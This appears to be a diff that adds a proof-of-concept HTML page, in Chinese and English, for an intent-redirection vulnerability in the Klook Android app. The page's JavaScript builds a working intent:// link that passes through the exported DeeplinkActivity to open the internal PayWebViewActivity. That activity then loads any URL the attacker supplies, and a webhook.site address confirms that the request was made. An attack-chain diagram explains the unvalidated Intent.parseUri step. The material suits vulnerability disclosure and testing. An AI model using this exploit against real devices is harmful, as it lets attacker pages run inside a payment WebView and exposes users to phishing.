@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DeeplinkActivity Intent Redirect - PoC Test</title>
+    <style>
+        body { font-family: monospace; padding: 20px; background: #1e1e1e; color: #d4d4d4; max-width: 720px; margin: 0 auto; }
+        h2 { color: #f48771; }
+        .section { margin: 20px 0; padding: 16px; background: #252526; border-left: 4px solid #569cd6; border-radius: 2px; }
+        .label { color: #9cdcfe; font-weight: bold; margin-bottom: 10px; }
+        .url-box { word-break: break-all; background: #1a1a1a; padding: 10px; border-radius: 4px; font-size: 11px; color: #ce9178; line-height: 1.6; }
+        a.poc-link { display: inline-block; margin-top: 12px; padding: 12px 24px; background: #d73a49; color: #fff; text-decoration: none; border-radius: 4px; font-size: 15px; }
+        a.poc-link:hover { background: #b5282d; }
+        input[type=text] { width: 100%; box-sizing: border-box; padding: 8px 10px; background: #3c3c3c; border: 1px solid #555; color: #fff; border-radius: 4px; font-family: monospace; font-size: 13px; }
+        button { margin-top: 8px; padding: 7px 16px; background: #0e639c; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 13px; }
+        button:hover { background: #1177bb; }
+        .note { color: #808080; font-size: 12px; margin-top: 8px; line-height: 1.5; }
+        .note a { color: #569cd6; }
+        .badge { display: inline-block; padding: 2px 6px; border-radius: 3px; font-size: 11px; margin-left: 6px; vertical-align: middle; }
+        .badge-vuln { background: #d73a49; color: #fff; }
+        .badge-fixed { background: #28a745; color: #fff; }
+        pre { font-size: 12px; color: #b5cea8; line-height: 1.6; margin: 0; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <h2>PoC: Intent Redirection → PayWebViewActivity</h2>
+
+    <div class="section">
+        <div class="label">Step 1: 填入 Webhook 接收地址</div>
+        <p class="note">
+            前往 <a href="https://webhook.site" target="_blank">webhook.site</a> 获取一个专属 URL（如 <code>https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx</code>），粘贴到下方。<br>
+            漏洞触发后，PayWebViewActivity 会向该地址发起请求，webhook.site 会记录下来。
+        </p>
+        <input type="text" id="webhookUrl" placeholder="https://webhook.site/your-unique-id" />
+        <button onclick="updateLink()">生成 PoC 链接</button>
+    </div>
+
+    <div class="section">
+        <div class="label">Step 2: 生成的 Intent URL</div>
+        <div class="url-box" id="intentUrl">（填入 Webhook 地址后自动生成）</div>
+    </div>
+
+    <div class="section">
+        <div class="label">Step 3: 在 Android 手机上点击触发</div>
+        <a class="poc-link" id="pocLink" href="#">点击触发漏洞</a>
+        <p class="note">
+            <span class="badge badge-vuln">漏洞存在</span> Klook App 打开，PayWebViewActivity 加载 Webhook URL，webhook.site 收到请求<br>
+            <span class="badge badge-fixed">已修复</span> App 不响应，或打开后 WebView 拒绝加载并关闭页面
+        </p>
+    </div>
+
+    <div class="section">
+        <div class="label">攻击链</div>
+        <pre>
+外部 intent:// 链接（本页面）
+  → DeeplinkActivity（exported=true）
+  → initView: Intent.parseUri(extras.url)  ← 无校验，直接解析外部传入的 intent URI
+  → 解析出指向 PayWebViewActivity 的 Intent，携带 load_url=Webhook URL
+  → startActivity（同 App 内启动，不受 exported=false 限制）
+  → PayWebViewActivity.initData(): mWebView.loadUrl(load_url)  ← 加载攻击者页面
+        </pre>
+    </div>
+
+    <script>
+        function buildIntentUrl(webhookUrl) {
+            const innerIntent = `intent:#Intent;component=com.klook/com.klook.cashier_implementation.ui.activity.PayWebViewActivity;S.load_url=${webhookUrl};end`;
+            const encodedInner = encodeURIComponent(innerIntent);
+            return `intent://payment_callback#Intent;scheme=klook;package=com.klook;component=com.klook/com.klook.cashier_implementation.ui.activity.DeeplinkActivity;S.action=ACTION_START_APP;S.url=${encodedInner};end`;
+        }
+
+        function updateLink() {
+            const webhook = document.getElementById('webhookUrl').value.trim();
+            if (!webhook) return;
+            const url = buildIntentUrl(webhook);
+            document.getElementById('intentUrl').textContent = url;
+            document.getElementById('pocLink').href = url;
+        }
+
+        document.getElementById('webhookUrl').addEventListener('input', updateLink);
+    </script>
+</body>
+</html>
